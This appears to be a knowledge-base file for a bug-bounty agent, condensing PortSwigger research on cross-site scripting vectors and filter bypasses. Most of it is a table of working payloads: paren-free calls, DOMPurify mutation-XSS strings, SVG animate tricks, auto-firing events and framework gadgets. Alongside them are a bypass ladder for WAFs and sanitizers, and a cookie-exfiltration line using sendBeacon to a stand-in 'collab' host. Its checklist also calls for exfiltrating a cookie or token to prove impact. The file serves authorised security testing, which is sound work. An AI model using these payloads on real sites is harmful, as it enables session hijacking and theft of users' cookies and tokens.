# XSS Vectors & Filter Bypass — Research Articles Compendium

> 24 PortSwigger Research articles (2015-2024): XSS vectors, WAF/filter bypasses, sanitizer escapes. Legacy filter bugs are dead but patterns power new bypasses.

## Article Map

- 2015 | XSS research index | full catalog + cheat sheet
- 2015 | hidden input fields | accesskey+onclick
- 2017 | Abusing JS frameworks | Mavo beats NoScript/CSP/DOMPurify
- 2019 | XSS no parens/semicolons | `{onerror=alert}throw 1337`
- 2019 | One XSS cheatsheet | :target transitions; hash-focus
- 2020 | SVG animate | keyTimes pins javascript: href
- 2020 | Redefining impossible | oracle+stop()+load-count exfil
- 2020 | DOMPurify mXSS | math/mglyph/style confusion
- 2020 | Unexploitable labs | 8 unsolved = unexploitable
- 2020 | JS via DOMMatrix | setter passes args
- 2020 | Transient events | onpagehide: sendBeacon
- 2020 | Attacking JS sandboxes | with/proxy; async+import()
- 2020 | Sandbox escapes parsing | Safari Unicode bug
- 2021 | print() replaces alert | Chrome 92 iframe dialogs
- 2022 | New XSS vectors | style-less transitions; SVG use
- 2022 | Community favourites | onbeforeinput, pointer*, atob
- 2022 | Seventh way no parens | template placeholders typed args
- 2022 | Hidden inputs + meta | popover onbeforetoggle
- 2022 | Firefox Sanitizer bypass | same-origin SVG use
- 2024 | New exotic events | webkit events; autofocus

## Key Techniques

- Paren-free calls (7 ways): `` alert`1337` ``; `throw onerror=alert,1337`; `` Function`x${'alert(1)'}x` ``; `'alert(1)'instanceof{[Symbol.hasInstance]:eval}`; `valueOf=alert;window+''`; DOMMatrix setter (`x.a=1337;location='javascript'+':'+x`); tagged-template placeholders pass typed args to methods like sort.
- Non-alphanumeric JS: chars from +[]/undefined -> `[]['find']['constructor']('alert(1)')()`.
- mXSS vs DOMPurify: foreign-content parser disagreement (math/mtext/table/mglyph + style w/ comment) re-mutates sanitized HTML into img onerror. Chrome `<!--`; FF: CDATA+mglyph+&Tab;.
- Hidden inputs/meta: accesskey+onclick (ALT+SHIFT+X); modern popover API — popover attr + duplicate id of existing popover target fires onbeforetoggle/ontoggle on hidden input/meta.
- Firefox HTML Sanitizer: SVG `<use>` same-origin absolute URL import runs script despite Content-Disposition: attachment.
- Sandbox escapes: brace-out of with; unfrozen prototypes (indexOf lies); `''.sub.constructor`; `import-->('data:...')`; Safari mis-parses 721k Unicode escapes (`\u{10ffdc}=alert;typeof\u{10ffdc}(1)`).
- Transient events: onpagehide blocks alert+requests; sendBeacon still POSTs cookies/DOM. Chrome 92+: print().
- SVG animate: values+keyTimes+repeatCount pin javascript: href mid-list; animate swaps use href to data: SVG.
- Auto-fire: :target transition (needs #hash) or outline transition+tabindex (no style block); hash-focus url#x fires onfocus on input/map/area/iframe/embed/object; autofocus works on almost any tag w/ tabindex.
- Exotic events: onbeforeinput, onpointercancel, pointer* set, onwebkitmouseforce*, onwebkitplaybacktargetavailabilitychanged (Safari).
- Dangling markup: scriptless capture of trailing HTML via unclosed attr — weaker, INFO.
- ZalgoScript: combining-char identifiers evade naive tokenizers.

## Payload / Bypass Table

- `<input type=hidden accesskey=X onclick=alert(1)>` | hidden input/link | victim hits ALT+SHIFT+X
- `<script>{onerror=alert}throw 1337</script>` | parens+semicolons blocked | throw expr = handler arg
- `<script>throw onerror=alert,'x',1</script>` | parens/semicolons | eval variant: `throw onerror=eval,'=alert(name)'`
- `x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x` | throw banned | setter passes arg
- `<style>:target{color:red}</style><x id=x style="transition:color 1s" ontransitionend=alert(1)>` + #x | event denylists | auto-fires any tag (Chrome; FF transitionrun)
- `<xss style="display:block;transition:outline 1s" id=x tabindex=1 ontransitionend=alert(1)>` | no style block | focus-outline transition
- `<input onfocus=alert(1) id=x>` + url#x | no autofocus | input/map/area/iframe/embed/object
- `<svg><animate xlink:href=#xss attributeName=href values="0;javascript:alert(1);0" keytimes="0;0;1" dur=5s repeatCount=indefinite/><a id=xss>` | WAFs scanning javascript: | pinned via keyTimes
- `<svg><use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><image href=1 onerror=alert(1)/></svg>#x"/></svg>` | script-tag filters | use data-URL executes
- `<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">` | DOMPurify pre-2.1 | mXSS; FF: CDATA + mglyph + &Tab;
- `<body onpagehide="navigator.sendBeacon('https://collab',cookie)">` | transient events | beacon survives unload
- `<img src=x onerror=location=atob&grave;amF2YXNjcmlwdDphbGVydCgxKQ==&grave;>` | WAFs missing backticks | base64 redirect
- `<input onbeforeinput=alert(1)>` / `<xss onpointercancel=alert(1)>` | event denylists | pointer needs touch cancel
- `<input ng-cut=$event.path|orderBy:'(y=alert)(1)'>` | AngularJS short limit | all versions Chrome
- `<x v-if=_c.constructor('alert(1)')()>` | Vue reflected | tiny gadget

## By-Design / SKIP Filters

- Unexploitable XSS labs (WAF blocks `<[a-zA-Z]`; escaped quotes; innerHTML no `=`; 14-16 char limits; frameset-before-body) = by design; matching = INFO unless lab solved.
- Scriptless fallbacks (dangling markup, CSS exfil) = INFO.
- Self-XSS = SKIP (report only when chained).
- Unproven/blocked chain = INFORMATIONAL.
- Dead tech (XSS Auditor removed 2019, old Edge/IE filters) = historical; only if legacy in scope.

## Severity Guide

- Stored XSS in account context = HIGH/CRIT (session/token theft = CRIT).
- Reflected/DOM XSS (unusual input) = MED.
- CSP-blocked-only = INFO. Scriptless/dangling-markup-only = INFO.

## Reporting Checklist

1. Map context: body / attribute / JS string / hidden input / meta / link / SVG.
2. Enumerate charset filters (parens, semicolons, quotes, backticks) + event denylists.
3. Bypass ladder: exotic event -> auto-fire -> paren-free call -> mXSS vs sanitizer.
4. Confirm in current Chrome + Firefox (+ Safari for webkit events).
5. Cross-origin iframe: prove with print(), not alert().
6. Prove impact: exfil cookie/token via sendBeacon to collaborator.
7. Match vs impossible labs; if matched, downgrade to INFO.
8. Record vector, browsers, interaction required.

> Master KB: agent-kb-bounty-exploit-master.md authority > SKILL.md. Unproven/blocked chain = INFORMATIONAL.
